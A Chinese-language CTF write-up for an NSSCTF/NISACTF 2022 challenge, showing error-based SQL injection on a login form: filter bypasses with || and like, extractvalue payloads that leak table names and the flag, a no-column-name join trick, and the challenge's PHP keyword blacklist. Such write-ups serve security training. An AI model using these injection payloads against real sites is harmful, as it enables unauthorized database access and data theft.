#SQL注入 #报错注入 
登陆页面有输入框

报错注入

- or被过滤用 ||代替
- = 被过滤用like代替

database里面的as被过滤，通过查询一个不存在的表，通过报错获得表名
```sql
-1' || (select * from aa)#
```
Table 'sqlsql.aa' doesn't exist

```sql
1' || extractvalue(1,concat(0x07, (select group_concat(table_name) from information_schema.tables where table_schema like 'sqlsql'), 0x07))#
```
XPATH syntax error: 'Fal_flag,output'

column 被过滤，参考 
[SQL注入绕过之过滤了‘as‘与无列名注入_sql注入表名被过滤_买Lemon也用劵的博客-CSDN博客](https://blog.csdn.net/weixin_52118430/article/details/125107854?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165892926816782425178259%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=165892926816782425178259&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~pc_rank_v35-7-125107854-null-null.142%5Ev35%5Eexperiment_28w_v1,185%5Ev2%5Econtrol&utm_term=%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5&spm=1018.2226.3001.4187)
```sql
1' || extractvalue(1,concat(0x07, (select * from(select * from output b join output c)a), 0x07))#

1' || extractvalue(1,concat(0x07, (select * from(select * from output b join output c using(data))a), 0x07))#
```
XPATH syntax error: 'NSSCTF{7a079280-ba0f-483d-a8...'
直接获得半个flag
获取剩下半个
```sql
1' || extractvalue(1,concat(0x07, (select mid(data,28) from output), 0x07))#
```

```php
$blacklist = "union|left|right|and|or|by|if|\&|sleep|floor|substr|ascii|=|\"|benchmark|as|column|insert|update";
```

[[NISACTF 2022]下_[nisactf 2022]is secret_偶尔躲躲乌云334的博客-CSDN博客](https://blog.csdn.net/qq_62046696/article/details/126023632)
